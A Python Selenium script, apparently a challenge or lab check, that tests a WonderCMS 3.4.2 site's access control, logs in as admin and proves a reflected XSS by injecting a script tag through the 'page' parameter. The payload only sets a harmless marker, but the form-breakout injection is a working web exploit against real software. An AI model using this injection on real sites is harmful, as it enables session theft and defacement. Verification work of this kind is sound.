#!/usr/bin/env python3
"""Real Chromium smoke and benign XSS execution proof for WonderCMS 3.4.2."""
from __future__ import annotations

import os
import urllib.error
import urllib.parse
import urllib.request

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

BASE = "http://wondercms-target:8080"
PASSWORD = os.environ["ADMIN_PASSWORD"]
EXPECTED_FLAG = os.environ["EXPECTED_FLAG"]

def fetch(path):
    with urllib.request.urlopen(BASE + path, timeout=8) as res:
        return res.status, res.read().decode("utf-8", "replace")

assert "Northbound Press" in fetch("/")[1]
for path in ("/data/database.js", "/review-proof.php"):
    try:
        fetch(path)
    except urllib.error.HTTPError as err:
        assert err.code in (403, 404), (path, err.code)
    else:
        raise AssertionError("Anonymous visitor gained unauthorized access")
print("PASS: real publisher site and private data access control", flush=True)

options = Options()
options.binary_location = "/usr/bin/chromium-browser"
options.add_argument("--headless")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-gpu")
options.add_argument("--window-size=1200,850")
driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=options)
try:
    driver.get(BASE + "/index.php?page=loginURL")
    assert driver.find_elements(By.NAME, "password")
    pwd = driver.find_element(By.NAME, "password")
    pwd.send_keys(PASSWORD)
    pwd.submit()
    WebDriverWait(driver, 10).until(lambda d: "Settings" in d.page_source or "Logout" in d.page_source)
    print("PASS: authenticated native WonderCMS PHP session", flush=True)

    # Check the protected challenge objective independently of the reflected
    # input, so the objective cannot be mistaken for the vulnerability.
    driver.get(BASE + "/review-proof.php")
    assert EXPECTED_FLAG in driver.page_source
    driver.get(BASE + "/index.php?page=home")
    assert driver.execute_script("return window.__wc_browser_marker || null") is None

    # A harmless JavaScript marker proves actual browser execution in the
    # upstream CMS page context, instead of merely matching a raw HTML string.
    benign_js = 'window.__wc_browser_marker="actual-execution"'
    injection = 'loginURL?"></form><script>' + benign_js + '</script><form action="'
    url = BASE + "/index.php?page=" + urllib.parse.quote(injection, safe="?")
    driver.get(url)
    WebDriverWait(driver, 12).until(
        lambda d: d.execute_script("return window.__wc_browser_marker || null") == "actual-execution"
    )
    print("PASS: genuine upstream WonderCMS 3.4.2 reflected XSS executes benign JavaScript in Chromium", flush=True)
finally:
    driver.quit()
